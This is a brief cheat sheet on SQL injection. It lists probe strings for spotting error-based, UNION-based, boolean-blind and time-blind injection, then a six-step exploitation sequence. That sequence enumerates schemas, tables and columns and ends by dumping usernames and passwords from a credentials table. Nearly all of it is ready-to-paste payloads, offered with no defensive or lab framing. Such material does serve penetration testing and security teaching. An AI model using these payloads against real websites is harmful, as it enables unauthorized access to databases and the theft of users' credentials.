# SQL Injection Basics

SQL Injection is a web vulnerability where an attacker can manipulate database queries by injecting malicious SQL code into input fields.

# How to Identify SQL Injection

1. Error-Based SQL Injection

' = %27
" = %22
# = %23
; = %3B
) = %29

If SQL or PHP error appears in response, it indicates error-based SQL injection.

2. UNION-Based SQL Injection

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

When error appears, previous number is column count.

' UNION SELECT NULL,NULL--

If response changes, UNION injection possible.

3. Boolean-Based Blind SQL Injection

' AND 1=1--
' AND 1=2--

If response differs, Boolean-based SQLi exists.

4. Time-Based Blind SQL Injection

' AND SLEEP(10)--

If response delays, Time-based SQLi possible.

# How to Exploit SQL Injection

Step 1: Find Column Count

order by 2-- -

Step 2: Find Database Version

' UNION SELECT NULL, @@VERSION--
' UNION SELECT NULL, VERSION()--
' UNION SELECT NULL, BANNER FROM V$VERSION--

Step 3: Schema Enumeration

' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -

Step 4: Table Enumeration

' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 
FROM INFORMATION_SCHEMA.TABLES 
WHERE table_schema='dev'-- -

Step 5: Column Enumeration

' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE table_name='credentials'-- -

Step 6: Data Dump

' UNION SELECT 1, username, password, 4 
FROM dev.credentials-- -
